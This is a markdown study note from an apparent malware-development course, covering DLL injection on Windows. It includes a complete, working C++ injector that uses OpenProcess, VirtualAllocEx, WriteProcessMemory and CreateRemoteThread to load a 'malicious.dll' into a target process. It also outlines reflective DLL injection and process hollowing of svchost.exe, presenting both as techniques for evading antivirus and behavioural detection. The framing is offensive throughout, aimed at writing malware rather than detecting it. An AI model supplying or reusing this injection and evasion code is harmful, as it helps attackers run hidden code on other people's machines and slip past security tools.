# Index 
- [[2. Key C++ Concepts for Malware]]
	- [[2.1 Windows API (WinAPI) for Malware Development]]
	- [[2.2 Code Obfuscation Techniques]]
	- [[2.3 PE File Structure and Manipulation]]
	- [[2.4 DLL Injection Techniques]]

# What is DLL Injection?

DLL injection allows an attacker or legitimate software to run code within the context of another process. This is achieved by forcing the target process to load a dynamic link library (DLL) and execute functions within that DLL. Since the injected code runs in the context of the target process, it inherits the permissions and privileges of that process, often bypassing certain security controls.

# Common DLL Injection Techniques

There are various techniques for DLL injection, each with its own advantages and limitations. Here we will explore the following:

1. Classic DLL Injection using `LoadLibrary`
2. Manual Mapping (Reflective DLL Injection)
3. Process Hollowing (Advanced Process Injection)

# Classic DLL Injection Using `LoadLibrary`

This is the most basic and commonly used method. In this technique, the injector process forces the target process to call `LoadLibrary`, which loads the DLL into the target process’s memory space. The steps are as follows:

#### Steps for Classic DLL Injection

1. Open the Target Process: Obtain a handle to the target process using `OpenProcess`.
2. Allocate Memory in Target Process: Use `VirtualAllocEx` to allocate space in the target process’s memory for the path of the DLL.
3. Write the Path of the DLL: Use `WriteProcessMemory` to write the DLL’s path into the target process’s memory.
4. Create a Remote Thread: Use `CreateRemoteThread` to create a new thread in the target process that calls `LoadLibrary` with the DLL’s path as an argument.

#### C++ Implementation Example

```cpp
#include <windows.h>
#include <iostream>

bool InjectDLL(DWORD processID, const char* dllPath) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processID);
    if (hProcess == NULL) {
        std::cout << "Failed to open process." << std::endl;
        return false;
    }

    // Allocate memory in the target process for the DLL path
    LPVOID pRemoteMemory = VirtualAllocEx(hProcess, NULL, strlen(dllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
    if (pRemoteMemory == NULL) {
        std::cout << "Failed to allocate memory in target process." << std::endl;
        CloseHandle(hProcess);
        return false;
    }

    // Write the DLL path into the target process's memory
    if (!WriteProcessMemory(hProcess, pRemoteMemory, dllPath, strlen(dllPath) + 1, NULL)) {
        std::cout << "Failed to write DLL path to target process memory." << std::endl;
        VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    // Get the address of LoadLibraryA
    HMODULE hKernel32 = GetModuleHandle("kernel32.dll");
    LPVOID pLoadLibrary = (LPVOID)GetProcAddress(hKernel32, "LoadLibraryA");

    // Create a remote thread to call LoadLibraryA with the DLL path
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pLoadLibrary, pRemoteMemory, 0, NULL);
    if (hThread == NULL) {
        std::cout << "Failed to create remote thread." << std::endl;
        VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    // Wait for the remote thread to finish
    WaitForSingleObject(hThread, INFINITE);

    // Clean up
    VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
    CloseHandle(hThread);
    CloseHandle(hProcess);

    return true;
}

int main() {
    DWORD processID = 1234;  // Replace with the target process ID
    const char* dllPath = "C:\\path\\to\\your\\malicious.dll";

    if (InjectDLL(processID, dllPath)) {
        std::cout << "DLL injected successfully!" << std::endl;
    } else {
        std::cout << "DLL injection failed." << std::endl;
    }

    return 0;
}
```

#### Explanation
1. OpenProcess: Gets a handle to the target process using its PID.
2. VirtualAllocEx: Allocates memory inside the target process for storing the path to the DLL.
3. WriteProcessMemory: Writes the DLL path into the allocated memory.
4. CreateRemoteThread: Calls `LoadLibrary` inside the target process to load the DLL.

#### Limitations
- Easy to detect: Many antivirus software solutions monitor calls to `CreateRemoteThread` and `LoadLibrary` for suspicious activity.
- Requires file on disk: The DLL must be present on disk, which is a common weakness.

# Manual Mapping (Reflective DLL Injection)

Reflective DLL injection is a more sophisticated method that allows loading a DLL from memory without having it touch the disk. In this method, you manually map the sections of the DLL into the target process’s memory and execute it, bypassing the Windows loader and avoiding detection by many AV solutions.

#### Steps for Reflective DLL Injection

1. Allocate Memory in the Target Process: Allocate space in the target process’s memory for the DLL.
2. Manually Map the DLL: Map the sections of the DLL into the target process’s memory, simulating the behavior of the Windows loader.
3. Resolve Imports: Resolve the dependencies and imports of the DLL manually.
4. Run the DLL: Call the entry point of the DLL manually after mapping it into memory.

Here’s an outline of reflective DLL injection, though an actual implementation would involve significant complexity:

#### Key Differences
- No Need for LoadLibrary: Since the DLL is loaded manually, `LoadLibrary` and `WriteProcessMemory` are not needed.
- AV Evasion: Since the DLL doesn’t exist as a file on disk, it avoids file-based detection methods.

Reflective DLL injection relies on creating a reflective loader within the DLL itself. This loader is responsible for loading the DLL into memory when injected.

Example reflective loader structure:
```cpp
extern "C" __declspec(dllexport) void ReflectiveLoader() {
    // Perform manual mapping, section copying, and import resolving
    // Simulate PE loader behavior
}
```

After compiling the DLL, you would inject it into the target process and manually invoke this reflective loader. Reflective injection is commonly used in offensive security tools like Meterpreter and Cobalt Strike.

#### Challenges
- Complexity: Reflective injection is significantly more complex to implement than classic DLL injection.
- Manual Import Resolution: You need to manually resolve all imports and handle relocation.

# Process Hollowing (Advanced Process Injection)

Process hollowing is an advanced technique where an attacker creates a legitimate process and then replaces its memory with malicious code. The new process appears benign to the system and security products, but it is executing malicious code.

#### Steps for Process Hollowing

1. Create a Suspended Process: Use `CreateProcess` with the `CREATE_SUSPENDED` flag to create a new process in a suspended state.
2. Unmap the Process Memory: Use `NtUnmapViewOfSection` to remove the legitimate code of the suspended process.
3. Allocate Memory for the Malicious Code: Allocate memory for the malicious code in the suspended process using `VirtualAllocEx`.
4. Write the Malicious Code: Use `WriteProcessMemory` to write the malicious executable’s code into the target process.
5. Set the Entry Point: Modify the target process's entry point using `SetThreadContext`.
6. Resume the Process: Resume the process to execute the injected malicious code.

#### C++ Outline
```cpp
// Example: Outline of process hollowing

STARTUPINFO si = { sizeof(si) };
PROCESS_INFORMATION pi;

// Step 1: Create the target process in a suspended state
if (CreateProcess(NULL, "C:\\Windows\\System32\\svchost.exe", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
    // Step 2: Unmap the legitimate code of the process (NtUnmapViewOfSection or similar)

    // Step 3: Allocate memory for the malicious executable

    // Step 4: Write malicious code into the process's memory

    // Step 5: Modify the entry point using SetThreadContext

    // Step 6: Resume the process to execute the malicious code
    ResumeThread(pi.hThread);
}
```

#### Why is Process Hollowing Effective?
- Trusted Process: The malicious code runs within a legitimate process, evading many security tools.
- Behavior-based Detection Evasion: Since the process is legitimate and trusted, it evades behavioral analysis, making it more stealthy than traditional injection.

# Key Points for DLL Injection Techniques

- Classic DLL Injection: Simple, widely known, and effective but also detectable due to reliance on `LoadLibrary` and file-based DLL.
- Reflective DLL Injection: A more sophisticated method that avoids writing files to disk and evades many detection techniques by loading DLLs from memory.
- Process Hollowing: An advanced technique that replaces the contents of a legitimate process with malicious code while making it look benign, providing high evasion potential.

# Tools to Test and Improve

- x64dbg or OllyDbg: Debuggers to monitor the injection process and trace the code execution.
- Process Hacker: Use it to inspect the memory space of processes to check whether the DLL has been loaded.
- Cuckoo Sandbox: A sandbox environment to analyze the behavior of your injected code.